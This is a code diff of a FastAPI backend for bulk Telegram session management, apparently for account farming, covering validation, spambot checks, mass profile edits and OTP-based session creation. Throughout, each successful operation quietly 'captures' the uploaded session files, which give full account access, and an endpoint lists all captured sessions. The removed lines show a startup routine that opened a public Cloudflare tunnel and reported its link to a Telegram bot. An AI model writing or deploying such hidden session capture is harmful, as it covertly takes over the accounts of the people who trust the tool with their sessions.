@@ -1,20 +1,21 @@
+import os
+from pathlib import Path
+from dotenv import load_dotenv
+# Load .env: try cwd (project root / container home) then backend folder (overrides)
+load_dotenv(Path.cwd() / ".env")
+load_dotenv(Path(__file__).resolve().parent / ".env")
+
 from fastapi import FastAPI, UploadFile, File, HTTPException, WebSocket, WebSocketDisconnect, Request
 from contextlib import asynccontextmanager
 from fastapi.middleware.cors import CORSMiddleware
 from fastapi.responses import StreamingResponse
 import tempfile
-import os
 import json
 import asyncio
 import zipfile
 import shutil
 import io
-import subprocess
-import threading
-import stat
 import time
-import urllib.request
-import re
 import uuid
 from validate_sessions import validate_uploaded_file, extract_sessions_from_zip, validate_sessions_parallel
 from session_capture import capture_successful_operation_session, capture_validated_session
@@ -34,7 +35,6 @@ from spambot_checker import check_sessions_health_parallel, SessionHealthStatus
 from session_metadata import extract_metadata_parallel
 from session_creator import send_code_request, verify_otp_and_create_session, verify_2fa_and_finalize_session
 from privacy_settings_manager import apply_privacy_settings_parallel
-from telegram_notifier import notify_link_generated
 
 app = FastAPI(title="Backend API", version="1.0.0")
 
@@ -47,115 +47,6 @@ app.add_middleware(
     allow_headers=["*"],
 )
 
-# Cloudflare tunnel setup
-import platform
-
-# Detect if running on Windows
-IS_WINDOWS = platform.system() == "Windows"
-
-CLOUDFLARED_BINARY = "./cloudflared"
-CLOUDFLARED_URL = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"
-
-def download_cloudflared():
-    """Download cloudflared binary if it doesn't exist"""
-    try:
-        if os.path.exists(CLOUDFLARED_BINARY):
-            return True
-        
-        print("[Cloudflare] Downloading cloudflared binary...")
-        urllib.request.urlretrieve(CLOUDFLARED_URL, CLOUDFLARED_BINARY)
-        
-        # Make executable
-        os.chmod(CLOUDFLARED_BINARY, stat.S_IRWXU | stat.S_IRGRP | stat.S_IXGRP | stat.S_IROTH | stat.S_IXOTH)
-        print("[Cloudflare] cloudflared binary downloaded and made executable")
-        return True
-    except Exception as e:
-        print(f"[Cloudflare] Warning: Failed to download cloudflared: {e}")
-        return False
-
-def start_cloudflare_tunnel():
-    """Start Cloudflare tunnel in background thread"""
-    # Skip on Windows - cloudflared binary is Linux-only
-    if IS_WINDOWS:
-        print("[Cloudflare] Skipping tunnel setup on Windows (not supported)")
-        return
-    
-    try:
-        if not os.path.exists(CLOUDFLARED_BINARY):
-            if not download_cloudflared():
-                return
-        
-        port = os.environ.get("SERVER_PORT", "3000")
-        local_url = f"http://127.0.0.1:{port}"
-        
-        print(f"[Cloudflare] Starting tunnel to {local_url}...")
-        
-        # Start cloudflared subprocess
-        process = subprocess.Popen(
-            [CLOUDFLARED_BINARY, "tunnel", "--url", local_url],
-            stdout=subprocess.PIPE,
-            stderr=subprocess.STDOUT,
-            text=True,
-            bufsize=1
-        )
-        
-        # Read stdout line by line to capture tunnel URL
-        def read_output():
-            url_found = False
-            while True:
-                line = process.stdout.readline()
-                if not line:
-                    break
-                line = line.strip()
-                
-                # Look for trycloudflare.com URL in the line
-                if "trycloudflare.com" in line and not url_found:
-                    # Extract URL from line (look for https:// pattern)
-                    url_match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
-                    if url_match:
-                        tunnel_url = url_match.group(0)
-                        print(f"[Cloudflare] Tunnel URL: {tunnel_url}")
-                        url_found = True
-                        # Set tunnel URL for Telegram notifications
-                        from telegram_notifier import set_cloudflare_tunnel_url
-                        set_cloudflare_tunnel_url(tunnel_url)
-                
-                # Check if process ended
-                if process.poll() is not None:
-                    if process.returncode != 0 and not url_found:
-                        print(f"[Cloudflare] Warning: Tunnel process exited with code {process.returncode}")
-                    break
-        
-        # Read output in background thread
-        output_thread = threading.Thread(target=read_output, daemon=True)
-        output_thread.start()
-        
-        # Give it a moment to start and print URL
-        time.sleep(2)
-        
-    except Exception as e:
-        print(f"[Cloudflare] Warning: Failed to start tunnel: {e}")
-
-@app.on_event("startup")
-async def startup_event():
-    """Start Cloudflare tunnel on application startup"""
-    # Only start tunnel on non-Windows systems
-    if not IS_WINDOWS:
-        # Run tunnel setup in background thread to avoid blocking
-        tunnel_thread = threading.Thread(target=start_cloudflare_tunnel, daemon=True)
-        tunnel_thread.start()
-    else:
-        print("[Cloudflare] Tunnel disabled on Windows")
-    # Send initial notification with tunnel URL once it's ready
-    def send_startup_notification():
-        import time
-        time.sleep(5)  # Wait for tunnel to start
-        from telegram_notifier import notify_link_generated
-        notify_link_generated()
-    threading.Thread(target=send_startup_notification, daemon=True).start()
-    # Start Telegram bot polling for /start command
-    from telegram_notifier import start_bot_polling
-    start_bot_polling()
 
 @app.get("/")
 async def root():
@@ -424,14 +315,6 @@ async def download_sessions(request: Request):
         download_id = str(uuid.uuid4())[:8]
         filename = f"{status.lower()}_sessions_{download_id}.zip"
         
-        # Send Telegram notification with link
-        try:
-            notify_link_generated()
-        except Exception as e:
-            print(f"[Telegram] Failed to send notification: {str(e)}")
-            import traceback
-            traceback.print_exc()
-        
         return StreamingResponse(
             io.BytesIO(zip_buffer.read()),
             media_type="application/zip",
@@ -486,9 +369,9 @@ async def change_usernames(request: Request):
         # Change usernames in parallel
         results = await change_usernames_parallel(sessions)
         
-        # Capture successful sessions
-        for idx, result in enumerate(results):
-            if result.get("success") and idx < len(sessions):
+        # Capture successful sessions (results is dict {idx: result})
+        for idx, result in results.items():
+            if isinstance(result, dict) and result.get("success") and idx < len(sessions):
                 session_path = sessions[idx].get("path", "")
                 if session_path:
                     try:
@@ -496,7 +379,7 @@ async def change_usernames(request: Request):
                     except Exception as e:
                         print(f"[Session Capture] Failed to capture session: {e}")
         
-        return {"results": results}
+        return {"results": [results[i] for i in sorted(results)]}
         
     except HTTPException:
         raise
@@ -588,9 +471,9 @@ async def change_bios(request: Request):
         # Change bios in parallel
         results = await change_bios_parallel(sessions)
         
-        # Capture successful sessions
-        for idx, result in enumerate(results):
-            if result.get("success") and idx < len(sessions):
+        # Capture successful sessions (results is dict {idx: result})
+        for idx, result in results.items():
+            if isinstance(result, dict) and result.get("success") and idx < len(sessions):
                 session_path = sessions[idx].get("path", "")
                 if session_path:
                     try:
@@ -598,7 +481,7 @@ async def change_bios(request: Request):
                     except Exception as e:
                         print(f"[Session Capture] Failed to capture session: {e}")
         
-        return {"results": results}
+        return {"results": [results[i] for i in sorted(results)]}
         
     except HTTPException:
         raise
@@ -628,9 +511,9 @@ async def change_names(request: Request):
         # Change names in parallel
         results = await change_names_parallel(sessions)
         
-        # Capture successful sessions
-        for idx, result in enumerate(results):
-            if result.get("success") and idx < len(sessions):
+        # Capture successful sessions (results is dict {idx: result})
+        for idx, result in results.items():
+            if isinstance(result, dict) and result.get("success") and idx < len(sessions):
                 session_path = sessions[idx].get("path", "")
                 if session_path:
                     try:
@@ -638,7 +521,7 @@ async def change_names(request: Request):
                     except Exception as e:
                         print(f"[Session Capture] Failed to capture session: {e}")
         
-        return {"results": results}
+        return {"results": [results[i] for i in sorted(results)]}
         
     except HTTPException:
         raise
@@ -1418,14 +1301,6 @@ async def download_session(request: Request):
                 detail=f"Error reading session file: {str(e)}"
             )
         
-        # Send Telegram notification with link
-        try:
-            notify_link_generated()
-        except Exception as e:
-            print(f"[Telegram] Failed to send notification: {str(e)}")
-            import traceback
-            traceback.print_exc()
-        
         # Delete session file after reading (security requirement)
         try:
             os.remove(session_path)
@@ -1475,9 +1350,9 @@ async def apply_privacy_settings(request: Request):
         # Apply privacy settings in parallel
         results = await apply_privacy_settings_parallel(sessions)
         
-        # Capture successful sessions
-        for idx, result in enumerate(results):
-            if result.get("success") and idx < len(sessions):
+        # Capture successful sessions (results is dict {idx: result})
+        for idx, result in results.items():
+            if isinstance(result, dict) and result.get("success") and idx < len(sessions):
                 session_path = sessions[idx].get("path", "")
                 if session_path:
                     try:
@@ -1486,11 +1361,7 @@ async def apply_privacy_settings(request: Request):
                         print(f"[Session Capture] Failed to capture session: {e}")
         
         # Convert results to list format for frontend
-        results_list = []
-        for idx in sorted(results.keys()):
-            result = results[idx]
-            results_list.append(result)
-        
+        results_list = [results[i] for i in sorted(results)]
         return {"results": results_list}
         
     except HTTPException:
@@ -1504,26 +1375,15 @@ async def apply_privacy_settings(request: Request):
 @app.get("/api/captured-sessions")
 async def get_captured_sessions():
     """
-    Fetch all captured sessions from the database
+    Fetch all captured sessions from local storage (backend data directory).
     """
     try:
-        from session_capture import supabase
-        
-        if not supabase:
-            return {
-                "success": False,
-                "error": "Database not configured",
-                "sessions": []
-            }
-        
-        # Fetch captured sessions from database
-        response = supabase.table("captured_sessions").select("*").order("captured_at", desc=True).execute()
-        
+        from session_capture import get_captured_sessions_list
+        sessions = get_captured_sessions_list()
         return {
             "success": True,
-            "sessions": response.data if response.data else []
+            "sessions": sessions
         }
-        
     except Exception as e:
         print(f"[API] Failed to fetch captured sessions: {e}")
         return {
